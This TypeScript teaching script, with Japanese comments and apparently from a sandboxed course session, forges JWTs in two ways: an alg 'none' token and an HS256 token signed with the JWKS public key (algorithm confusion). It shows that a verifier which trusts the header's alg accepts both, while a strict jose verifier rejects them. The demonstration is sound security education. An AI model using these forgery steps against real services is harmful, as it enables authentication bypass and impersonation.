// 実行: docker compose exec app npx tsx src/session04/attacker-demo-forge.ts
// 脆弱な検証は破れること、厳格な検証は破れないことを、同じ偽造トークンで比べます。
// 攻撃の対象はこのサンドボックスの中にある自分のコードだけです。
import { AUDIENCE, ISSUER, fetchSigningKey } from "./bookstore-endpoints.js";
import { verifyByHeaderAlg } from "./api-service-verify-insecure.js";
import { verifyAccessToken } from "./api-service-verify-jwt.js";
import { forgeHs256Token, forgeNoneToken } from "./attacker-forge-tokens.js";

/** 厳格な検証が拒否することを期待して実行します */
async function expectRejected(token: string): Promise<void> {
  try {
    await verifyAccessToken(token);
    console.log("[jose による厳格な検証] 通ってしまった（実装を見直してください）");
  } catch {
    console.log("[jose による厳格な検証] 拒否されました");
  }
}

// 攻撃者も JWKS を読めます（公開情報なので、これは想定どおりの動作です）
const signingKey = await fetchSigningKey();
const nowSec = Math.floor(Date.now() / 1000);
const claims = {
  iss: ISSUER,
  sub: "attacker",
  aud: AUDIENCE,
  iat: nowSec,
  exp: nowSec + 300,
  jti: "forged-0001",
};

console.log("=== 実験 1: alg を none にしたトークン ===");
const noneToken = forgeNoneToken(claims);
console.log(`ヘッダ: ${Buffer.from(noneToken.split(".")[0] ?? "", "base64url").toString("utf8")}`);
console.log(`署名部分の長さ: ${(noneToken.split(".")[2] ?? "").length}`);
const viaNone = await verifyByHeaderAlg(noneToken, signingKey.modulus);
console.log(`[alg を信じる検証] 通ってしまった sub: ${String(viaNone["sub"])}`);
await expectRejected(noneToken);

console.log("\n=== 実験 2: 公開鍵を HMAC の共通鍵として使わせる（アルゴリズム混同） ===");
const hs256Token = await forgeHs256Token(claims, signingKey.modulus, signingKey.kid);
console.log(`攻撃者が使った鍵素材は JWKS から取得したもの: ${signingKey.modulus.length > 0}`);
console.log("ヘッダ: alg=HS256（kid は本物と同じ値を書き写している）");
const viaHs256 = await verifyByHeaderAlg(hs256Token, signingKey.modulus);
console.log(`[alg を信じる検証] 通ってしまった sub: ${String(viaHs256["sub"])}`);
await expectRejected(hs256Token);
